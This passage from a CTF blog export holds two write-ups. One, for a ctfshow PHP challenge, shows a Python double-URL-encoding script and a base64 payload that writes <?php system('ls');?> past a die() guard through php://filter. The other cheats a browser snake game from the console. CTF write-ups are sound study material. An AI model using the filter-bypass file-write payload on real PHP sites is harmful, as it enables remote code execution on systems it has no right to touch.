<p>这里是打开一个中间流，如果我们在文件名那里写上这个的话，那么<code>file_put_contents()</code>会这样做，把第二个参数的值以base64解码，并且写到flag.php文件中，接下来就介绍如何突破限制</p>
<h2 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h2><p>既然我们要写上上面的payload，那么该如何绕过，可以看到下面还有一层url解码，所以这里可以双重url编码绕过，自己用python写了个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;your payload:[+]&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twencode</span>(<span class="params">payload</span>):</span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="built_in">list</span>(payload)</span><br><span class="line">    length = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        asc = <span class="built_in">ord</span>(char)</span><br><span class="line">        x0 = <span class="built_in">hex</span>(asc)</span><br><span class="line">        t = x0.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        res += <span class="string">&#x27;%25&#x27;</span>+t</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+twencode(payload))</span><br><span class="line"><span class="comment">#check it</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[-]&quot;</span>+(urllib.parse.unquote((urllib.parse.unquote(twencode(payload))))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240316222716829.png"  alt="image-20240316222716829"></p>
<h2 id="绕过死亡"><a href="#绕过死亡" class="headerlink" title="绕过死亡"></a>绕过死亡</h2><p>前面提到会以base64解码的形式写入，介绍一下base64解码的过程</p>
<p>1.筛选字符，把不属于65个base64字符去掉</p>
<p>2.解码，每四个base64字符为一组解码</p>
<p>我们这样来操作一下<?php die('大佬别秀了');?></p>
<p>第一步剩下phpdie</p>
<p>第二步，由于只有6个字符，解码失败，所以我们要手动添加两个字符，给它乱解即可，反正最后执行我们的php代码即可</p>
<p>所以payload:<code>content=aaPD9waHAgc3lzdGVtKCdscycpOzs/Pg==</code>aa是自己加的，后面的是<?php system('ls');?></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240316180606776.png"  alt="image-20240316180606776"></p>
<p>最后再切换命令查看flag即可</p>
<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316194352222.png"  alt="image-20240316194352222"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240316194408379.png"  alt="image-20240316194408379"></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一题好玩的游戏题</title>
    <url>/2024/05/09/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%A2%98%E5%A5%BD%E7%8E%A9%E7%9A%84%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
    <content><![CDATA[<h1 id="我给五星"><a href="#我给五星" class="headerlink" title="我给五星"></a>我给五星</h1><span id="more"></span>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210350791.png"  alt="image-20240509210350791"></p>
<p>需要我们控制小蛇生存60s，玩玩看</p>
<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509205907%20(1).gif"  alt="QQ录屏20240509205907 (1)"></p>
<p>玩个蛋，给他60s估计都能飞上月球了</p>
<p>我们打开控制台看源码</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210928331.png"  alt="image-20240509210928331"></p>
<h1 id="高效解法"><a href="#高效解法" class="headerlink" title="高效解法"></a>高效解法</h1><p>可以看到一切都是从new一个snake开始的，注意到timeCounter计时器，于是我们在控制台new一个新的snake再修改计时器时间即可</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240509211124591.png"  alt="image-20240509211124591"></p>
<p>成功出现flag</p>
<h1 id="搞笑解法"><a href="#搞笑解法" class="headerlink" title="搞笑解法"></a>搞笑解法</h1><h2 id="修改地图大小"><a href="#修改地图大小" class="headerlink" title="修改地图大小"></a>修改地图大小</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240509211716297.png"  alt="image-20240509211716297"></p>
<p>看看效果</p>
<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509211757.gif"  alt="QQ录屏20240509211757"></p>
<p>可以看到撞墙了没有死，说明地图确实大了，然后咱们等他跑个60s就好</p>
<h2 id="改变小蛇速度"><a href="#改变小蛇速度" class="headerlink" title="改变小蛇速度"></a>改变小蛇速度</h2><p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509213044.gif"  alt="QQ录屏20240509213044"></p>
<p>因为小蛇速度会加快，那么我们就设置一个定时任务，每0.5秒重新设置一次速度就好了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ewoji = <span class="keyword">new</span> <span class="title class_">Snake</span>(<span class="string">&#x27;ewoji&#x27;</span>,<span class="number">1.5</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ewoji.<span class="property">speed</span> = <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> intervalID = <span class="built_in">setInterval</span>(myFunction, <span class="number">500</span>);</span><br></pre></td></tr></table></figure>

<p>或者干脆直接把speed设置为0，这样小蛇就会像bot一样在原地不动了</p>
<p>嘻嘻</p>
]]></content>
      <tags>
        <tag>-ctf</tag>
      </tags>
  </entry>
</search>
